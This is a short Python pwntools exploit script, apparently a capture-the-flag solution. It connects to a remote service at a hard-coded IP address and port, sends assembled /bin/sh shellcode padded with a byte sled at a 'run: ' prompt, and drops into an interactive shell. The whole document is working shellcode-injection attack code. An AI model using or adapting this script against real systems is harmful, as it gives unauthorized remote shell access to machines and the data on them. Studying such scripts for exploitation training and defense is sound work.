from pwn import *
context(arch="amd64", os="linux", log_level="debug")
s=remote("47.97.58.52",42012)
shellcode="xor rax,rax"+shellcraft.sh()
s.sendlineafter("run: ",asm(shellcode).rjust(0x100,b"\x91"))
s.interactive()